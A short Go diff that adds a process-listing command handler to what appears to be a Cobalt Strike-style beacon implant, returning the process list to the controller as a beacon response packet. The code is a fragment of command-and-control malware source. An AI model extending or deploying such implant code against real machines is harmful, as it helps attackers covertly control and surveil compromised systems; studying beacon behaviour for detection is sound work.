@@ -137,6 +137,10 @@ func main() {
 										pwdResult := packet.GetCurrentDirectory()
 										finPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_GETCWD, pwdResult) // 32
 										packet.PushResult(finPacket)
+									case packet.CMD_TYPE_LIST_PROCESS:
+										processList := packet.ListProcesses()
+										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_OUTPUT_PS, processList)
+										packet.PushResult(finalPacket)
 									case packet.CMD_TYPE_EXIT:
 										os.Exit(0)
 									default:
